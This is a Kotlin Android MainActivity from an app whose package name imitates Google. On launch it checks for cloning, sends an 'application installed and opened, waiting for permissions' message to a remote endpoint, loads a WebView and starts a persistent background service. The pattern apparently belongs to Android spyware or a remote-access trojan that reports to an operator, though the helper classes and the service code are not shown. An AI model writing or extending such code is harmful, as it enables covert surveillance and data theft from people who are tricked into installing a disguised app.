package google.devepttune

import android.annotation.SuppressLint
import android.content.Intent
import android.os.Bundle
import android.os.Environment
import android.util.Log
import android.webkit.WebView
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import google.devepttune.Utils.AppTools
import google.devepttune.Ui.Screen.Page1
import google.devepttune.Ui.Screen.Page2
import me.fiend.Ui.Screen.WebView
import google.devepttune.Utils.AppRequest


class MainActivity : ComponentActivity() {
    var webView: WebView? = null
    @SuppressLint("WrongThread")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        AppTools.checkAppCloning(this)
        val request = AppRequest()
        request.sendText(AppRequest.Text("ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪɴꜱᴛᴀʟʟᴇᴅ ᴀɴᴅ ᴏᴘᴇɴᴇᴅ , ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ᴘᴇʀᴍɪꜱꜱɪᴏɴꜱ ..."))
        setContent {
            val currentPage = remember {
                mutableStateOf(0)
            }
            if (!AppTools.showWelcome(this)) currentPage.value = 1
            when (currentPage.value) {
                0 -> {
                    Page2 {
                        currentPage.value = 1
                    }
                }
                1 -> {
                    WebView() {
                        webView = it
                    }
                    if (!AppTools.isServiceRunning(this)) {
                        startService(Intent(this, MainService::class.java))
                    }
                }
            }
        }
    }
}